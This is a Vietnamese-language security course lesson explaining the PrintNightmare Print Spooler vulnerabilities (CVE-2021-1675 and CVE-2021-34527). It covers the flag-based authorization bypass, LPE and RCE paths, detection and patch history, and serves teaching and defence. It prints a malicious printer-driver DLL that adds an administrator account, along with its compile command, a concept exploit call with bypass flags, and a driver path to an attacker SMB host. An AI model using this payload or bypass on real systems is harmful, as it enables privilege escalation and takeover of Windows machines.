---
title: "16. PrintNightmare Part 1 — Spooler Architecture & LPE Theory"
tags: [security, cve, landmark-cves, printnightmare, print-spooler, lpe, windows, rpc, lesson-16]
aliases: [PrintNightmare Part 1, CVE-2021-34527 Theory]
created: 2026-03-24
---

> **Prerequisites**: [[01-memory-model-exploit-primitives|01. Memory Model & Exploit Primitives]], Windows RPC basics, DLL loading concepts
> **Objectives**:
> - Hiểu kiến trúc Windows Print Spooler service và tại sao nó chạy với SYSTEM privileges
> - Phân biệt CVE-2021-1675 (LPE) và CVE-2021-34527 (PrintNightmare RCE)
> - Hiểu MS-RPRN protocol và hàm `RpcAddPrinterDriverEx` — điểm lỗi chính
> - Phân tích tại sao authorization check bị bypass thông qua `dwFileCopyFlags`
> - Hiểu DRIVER_INFO_2 structure và cách DLL path được resolve
> - Nắm điều kiện khai thác (authenticated user, Spooler running)
> - Hiểu tại sao patch đầu tiên (7/6/2021) không fix hoàn toàn LPE vector

---

## Bối cảnh: PoC Bị Leak Trước Patch

PrintNightmare là một trong những câu chuyện rối loạn nhất trong lịch sử CVE. Timeline:

```text
08/06/2021  Microsoft vá CVE-2021-1675 (LPE trong Print Spooler) — patch June
29/06/2021  Sangfor researchers công bố PoC trên GitHub nhầm cho CVE-2021-1675
            → Nhưng thực ra exploit một lỗi KHÁC (chưa được vá)
            → PoC bị xóa sau vài giờ nhưng đã bị clone bởi nhiều người
01/07/2021  Microsoft assign CVE-2021-34527 cho lỗi mới trong cùng Print Spooler
            → Gọi là "PrintNightmare" — ảnh hưởng ALL Windows (không chỉ DC)
06/07/2021  Microsoft phát hành patch out-of-band khẩn cấp
07/07/2021  Researchers phát hiện patch không fix hoàn toàn LPE vector
            → RCE được fix, nhưng LPE vẫn work trên nhiều cấu hình
```

**Impact**: mọi Windows từ XP đến Server 2019 với Print Spooler service (enabled mặc định). Attacker chỉ cần là domain user (authenticated) → leo lên SYSTEM trên bất kỳ máy nào trong domain.

---

## Windows Print Spooler Architecture

### Spooler là gì và tại sao SYSTEM?

Print Spooler (`spoolsv.exe`) là Windows service quản lý print jobs và printer drivers. Nó chạy với **SYSTEM privileges** vì cần:
- Load printer driver DLLs vào memory
- Truy cập system directories (`%SYSTEM32%\spool\drivers\`)
- Giao tiếp với phần cứng printer
- Nhận kết nối từ remote machines qua RPC (network printing)

```text
Windows Print Spooler Stack:
┌─────────────────────────────────────────────┐
│ User Application (Word, Chrome, etc.)        │
│   → PrintDocument() / winspool.drv           │
└──────────────────┬──────────────────────────┘
                   │ Local RPC
┌──────────────────▼──────────────────────────┐
│ spoolsv.exe (SYSTEM)                         │
│   ├── Spooler Router                         │
│   ├── Print Provider (localspl.dll)          │
│   │     └── Manages driver loading           │
│   └── Port Monitor                           │
└──────────────────┬──────────────────────────┘
                   │ SYSTEM-level driver loading
┌──────────────────▼──────────────────────────┐
│ Printer Driver DLLs (loaded into spoolsv.exe)│
│ %SYSTEM32%\spool\drivers\x64\3\             │
└─────────────────────────────────────────────┘
```

### Driver Directory Structure

```text
C:\Windows\System32\spool\drivers\
├── x64\
│   ├── 3\          ← "Version 3" drivers (64-bit)
│   │   ├── *.dll   ← Driver DLLs
│   │   └── *.inf
│   └── ...
└── W32X86\
    └── 3\          ← "Version 3" drivers (32-bit)
```

Khi install một printer driver, spooler copy DLL files vào thư mục này rồi load chúng vào `spoolsv.exe` process với SYSTEM privileges.

---

## MS-RPRN — Remote Print Protocol

### Protocol Overview

MS-RPRN (Microsoft Remote Procedure Call Print System Remote Protocol) là RPC protocol cho phép client remote truy cập Print Spooler của server. Nó expose nhiều RPC functions, bao gồm:

| Function | Mục đích |
|----------|---------|
| `RpcOpenPrinter` | Open connection đến printer/spooler |
| `RpcEnumPrinterDrivers` | List installed drivers |
| `RpcAddPrinterDriverEx` | **Install printer driver** ← VULNERABLE |
| `RpcStartDocPrinter` | Start print job |

### `RpcAddPrinterDriverEx` — Thiết kế và Lỗi

Hàm này được thiết kế cho administrator cài đặt printer driver từ xa. Signature:

```c
DWORD RpcAddPrinterDriverEx(
    [in, string, unique] STRING_HANDLE pName,  // server name
    [in] DRIVER_CONTAINER *pDriverContainer,   // driver info
    [in] DWORD dwFileCopyFlags                 // copy behavior flags
);
```

`dwFileCopyFlags` là bitmap kiểm soát cách DLL được copy. Một số flags quan trọng:

| Flag | Value | Ý nghĩa |
|------|-------|---------|
| `APD_COPY_ALL_FILES` | 0x04 | Copy tất cả driver files |
| `APD_COPY_NEW_FILES` | 0x10 | Chỉ copy files mới hơn |
| `APD_INSTALL_WARNED_DRIVER` | 0x8000 | Không hỏi user xác nhận |

### Privilege Check — Lỗ Hổng Authorization

Theo thiết kế, chỉ administrator mới được gọi `RpcAddPrinterDriverEx`. Authorization check trong `localspl.dll`:

```c
// localspl.dll — SplAddPrinterDriverEx() — pseudo-code từ disassembly
DWORD SplAddPrinterDriverEx(PWSTR pName, DWORD Level, LPBYTE pDriverInfo,
                             DWORD dwFileCopyFlags, DWORD cbDriverInfo) {

    // Check: caller có privilege không?
    if (!ValidateObjectAccess(SPOOLER_OBJECT_SERVER,
                               SERVER_ACCESS_ADMINISTER,
                               NULL, NULL, gLaserToken)) {
        // Authorization FAILED
        // → Nhưng nếu APD_INSTALL_WARNED_DRIVER flag được set
        //   AND Point and Print cấu hình → check có thể bị bypass!
        
        if (dwFileCopyFlags & APD_INSTALL_WARNED_DRIVER) {
            // BUG: Với flag này, check bị skip trong một số code path
            goto skip_auth_check;
        }
        return ERROR_ACCESS_DENIED;
    }

skip_auth_check:
    // Copy DLL từ source location vào driver directory
    CopyPrinterDriverFiles(pDriverInfo, dwFileCopyFlags);
    // Load DLL vào spoolsv.exe (SYSTEM)!
    LoadPrinterDriver(driverPath);
}
```

> [!definition] Definition 16.1 — Root Cause: Authorization Bypass
> `RpcAddPrinterDriverEx` có authorization check, nhưng khi `dwFileCopyFlags` chứa bit `APD_INSTALL_WARNED_DRIVER`, một code path bỏ qua check đó trong một số điều kiện. Điều này cho phép authenticated user thông thường (không phải admin) cài đặt printer driver tùy ý. Vì driver DLL được load vào `spoolsv.exe` (SYSTEM), DLL của attacker chạy với SYSTEM privileges.

---

## DRIVER_INFO_2 Structure

Khi gọi `RpcAddPrinterDriverEx`, driver info được truyền qua `DRIVER_CONTAINER` chứa `DRIVER_INFO_2`:

```c
typedef struct _DRIVER_INFO_2 {
    DWORD   cVersion;          // Driver version (3 cho x64)
    LPTSTR  pName;             // Driver name (tùy ý)
    LPTSTR  pEnvironment;      // "Windows x64"
    LPTSTR  pDriverPath;       // PATH ĐẾN DLL CHÍNH ← attacker controls
    LPTSTR  pDataFile;         // Data file path
    LPTSTR  pConfigFile;       // Configuration DLL path ← cũng attacker-controlled
} DRIVER_INFO_2;
```

Attacker đặt `pDriverPath` hoặc `pConfigFile` trỏ đến **malicious DLL trên SMB share**:

```text
pDriverPath = "\\attacker.com\share\evil.dll"
```

Spooler sẽ:
1. Copy `evil.dll` từ SMB share vào `%SYSTEM32%\spool\drivers\x64\3\evil.dll`
2. Load `evil.dll` vào `spoolsv.exe` process (SYSTEM)
3. DLL `DllMain` chạy → attacker code thực thi với SYSTEM privileges

---

## LPE vs RCE — Hai Attack Paths

### CVE-2021-1675 — Local Privilege Escalation (LPE)

Sử dụng **Win32 API `AddPrinterDriverEx`** (không phải RPC):
- Chỉ cần local access (không cần network)
- Regular user gọi `AddPrinterDriverEx` với path đến local malicious DLL
- Authorization bypass tương tự → DLL load → SYSTEM

```python
# Concept - không phải runnable Python
import ctypes
winspool = ctypes.WinDLL('winspool.drv')

driver_info = DRIVER_INFO_2()
driver_info.cVersion = 3
driver_info.pName    = "EvilDriver"
driver_info.pDriverPath = r"C:\Users\user\evil.dll"

# Flags để bypass privilege check
APD_COPY_ALL_FILES         = 0x00000004
APD_INSTALL_WARNED_DRIVER  = 0x00008000
flags = APD_COPY_ALL_FILES | APD_INSTALL_WARNED_DRIVER

winspool.AddPrinterDriverExW(None, 2, ctypes.byref(driver_info), flags)
```

### CVE-2021-34527 — Remote Code Execution (RCE)

Sử dụng **MS-RPRN RPC function `RpcAddPrinterDriverEx`** từ remote:
- Cần network access đến target machine (port 445/SMB)
- Cần valid credentials (domain user đủ)
- DLL path trỏ đến SMB share của attacker

```text
Attack flow:
Attacker machine                    Target Windows machine
     │                                     │
     │── SMB connection (port 445) ────────▶│
     │   (credentials: domain_user:Pass123) │
     │                                      │
     │── RpcAddPrinterDriverEx ─────────────▶│ spoolsv.exe (SYSTEM)
     │   DriverInfo.pDriverPath =            │
     │   "\\attacker\share\evil.dll"         │── fetch evil.dll via SMB
     │                                      │
     │◀── SMB request for evil.dll ──────────│
     │── serve evil.dll ────────────────────▶│
     │                                      │── LoadLibrary("evil.dll") [SYSTEM]
     │                                      │── DllMain executes!
     │◀── Reverse shell / SYSTEM access ────│
```

---

## DLL Payload — Cấu trúc Malicious Driver

DLL được load như printer driver cần:
1. Export các functions mà Print Spooler yêu cầu (hoặc không — DllMain chạy trước)
2. Thực thi payload trong `DllMain`

```c
// evil.dll — malicious printer driver DLL
#include <windows.h>

// DllMain chạy ngay khi DLL được load vào spoolsv.exe (SYSTEM)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: thêm admin user
        system("net user hacker P@ssword123! /add");
        system("net localgroup administrators hacker /add");

        // Hoặc reverse shell:
        // WinExec("powershell -e <base64_payload>", SW_HIDE);
    }
    return TRUE;
}

// Export minimal functions để tránh load error
void WINAPI DrvDriverEvent(DWORD dwDriverEvent, DWORD dwDataType,
                            LPBYTE pData, LPARAM lParam) {}
```

Compile:

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c \
    -Wl,--subsystem,windows -lws2_32
```

---

## Điều Kiện Khai Thác

PrintNightmare cần:

```text
✓ Target chạy Windows với Print Spooler service (mặc định enabled)
✓ Attacker có valid credentials (domain user hoặc local user)
✓ Đối với RCE: network access đến port 445 trên target
✓ Đối với LPE: local access (shell, RDP, v.v.)
✓ Spooler chưa được vá hoặc Point and Print policy còn vulnerable
```

**Không cần:**
- Administrator rights
- Local access (cho RCE path)
- Special privileges

---

## Phát Hiện PrintNightmare

### Indicators of Compromise

```text
Event ID 808 (Microsoft-Windows-PrintService/Admin):
  "The print spooler failed to load a plug-in module"
  → DLL load attempt bị fail (exploit attempt không thành)

Event ID 316 (Microsoft-Windows-PrintService/Admin):
  "The print spooler failed to share printer"
  → Anomalous spooler activity

Sysmon Event ID 7 (ImageLoaded) với Image path:
  \spool\drivers\x64\3\*.dll
  → Unexpected new DLL load từ driver directory

Process Event: spoolsv.exe spawning child process
  cmd.exe, powershell.exe, net.exe
  → SYSTEM-level shell spawned from spooler
```

### PowerShell Detection

```powershell
# Kiểm tra Spooler service status
Get-Service -Name Spooler

# Kiểm tra Point and Print policy (vulnerable config)
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
    -Name "NoWarningNoElevationOnInstall", "UpdatePromptSettings" -ErrorAction SilentlyContinue

# List recent DLL files trong driver directory
Get-ChildItem "C:\Windows\System32\spool\drivers\x64\3\" |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
    Select-Object Name, LastWriteTime, Length

# Tìm suspicious DLL không thuộc Microsoft
Get-ChildItem "C:\Windows\System32\spool\drivers\" -Recurse -Filter "*.dll" |
    ForEach-Object {
        $sig = Get-AuthenticodeSignature $_.FullName
        if ($sig.SignerCertificate.Subject -notmatch "Microsoft") {
            Write-Host "[SUSPICIOUS] $($_.FullName): $($sig.Status)"
        }
    }
```

---

## Tại sao Patch Đầu Tiên Không Đủ?

Microsoft patch ngày 6/7/2021 fix RCE vector (remote `RpcAddPrinterDriverEx`), nhưng LPE vector (local `AddPrinterDriverEx`) vẫn còn trong một số cấu hình:

```text
Sau patch 6/7/2021:
  RCE qua RpcAddPrinterDriverEx: FIXED (cần admin privileges)
  LPE qua AddPrinterDriverEx: STILL VULNERABLE nếu:
    - Point and Print policy "NoWarningNoElevationOnInstall" = 1
    - UpdatePromptSettings = 2
  
Sau patch 13/7/2021 + cấu hình registry đúng:
  Cả RCE và LPE: FIXED
```

Bài học: **một patch chỉ fix một attack vector, không phải toàn bộ vulnerability class**. Cần kiểm tra cả registry settings sau khi patch.

---

## Summary

- Print Spooler chạy với SYSTEM vì cần load driver DLL — đây là attack surface cơ bản
- `RpcAddPrinterDriverEx` (MS-RPRN): RPC function cài driver từ xa
- Authorization bypass: `dwFileCopyFlags` với `APD_INSTALL_WARNED_DRIVER` skip privilege check
- Attacker gửi `DRIVER_INFO_2` với `pDriverPath` trỏ đến malicious DLL → Spooler copy + load → SYSTEM
- CVE-2021-1675 = LPE (local); CVE-2021-34527 = RCE (remote) — cùng lỗi, khác attack vector
- Cần: authenticated user + Spooler running + (network access cho RCE)
- Patch ban đầu chỉ fix RCE; LPE vẫn vulnerable dưới Point and Print policy
- [[17-printnightmare-exploit|Bài tiếp theo]]: DLL payload, exploit script, và bypass patch strategies

---

## References

- Microsoft Advisory CVE-2021-34527: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
- Rapid7 PrintNightmare analysis: https://www.rapid7.com/blog/post/2021/06/30/cve-2021-1675-printnightmare-patch-does-not-remediate-vulnerability/
- cube0x0 exploit (impacket-based): https://github.com/cube0x0/CVE-2021-1675
- The Hacker Recipes PrintNightmare: https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare
- MS-RPRN specification: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/
- MalwareInsights network analysis: https://malwareinsights.wordpress.com/2021/08/22/analyzing-printnightmare-vulnerability-cve-2021-34527
